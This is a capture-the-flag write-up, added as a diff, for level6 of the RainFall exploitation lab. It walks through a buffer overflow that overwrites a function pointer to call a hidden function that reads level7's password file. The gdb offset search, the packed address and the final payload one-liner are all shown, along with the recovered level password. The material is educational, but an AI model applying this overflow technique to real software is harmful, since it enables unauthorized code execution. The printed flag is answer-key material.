@@ -1,0 +1,48 @@
+level6@RainFall:~$ ./level6 fdzxhcgjhk
+Nope
+level6@RainFall:~$ ./level6 12345
+Nope
+
+We can see in program function pointer is allocated, and lately address of m function is stored in int.
+
+(gdb) info symbol 0x08048468
+m in section .text
+
+There is also hidden function n that "/bin/cat /home/user/level7/.pass".
+We can perfom buffer overflow attack and write address of function n instead of function m.
+
+To do that we need to find offset and address of function n
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
+
+0x41346341 = offset 72
+
+Function n address:
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x08048454 <+0>:     push   %ebp
+   ...
+
+level6@RainFall:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import struct
+>>> struct.pack("<I", 0x08048454)
+'T\x84\x04\x08'
+
+level6@RainFall:~$ ./level6 $(python -c 'print "\x41" * 72 + "T\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+level6@RainFall:~$ su level7 
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
